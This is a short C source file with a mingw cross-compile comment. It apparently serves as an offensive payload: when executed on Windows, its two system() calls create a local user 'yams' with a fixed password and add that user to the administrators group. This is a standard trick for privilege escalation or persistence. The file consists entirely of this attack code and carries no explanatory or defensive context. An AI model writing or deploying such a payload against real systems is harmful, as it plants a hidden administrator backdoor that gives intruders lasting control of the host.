#include <stdlib.h>

// compile:
// x86_64-w64-mingw32-gcc adduser.c -o adduser.exe

int main ()
{
  int i;
  
  i = system ("net user yams P@ssword123! /add");
  i = system ("net localgroup administrators yams /add");
  
  return 0;
}
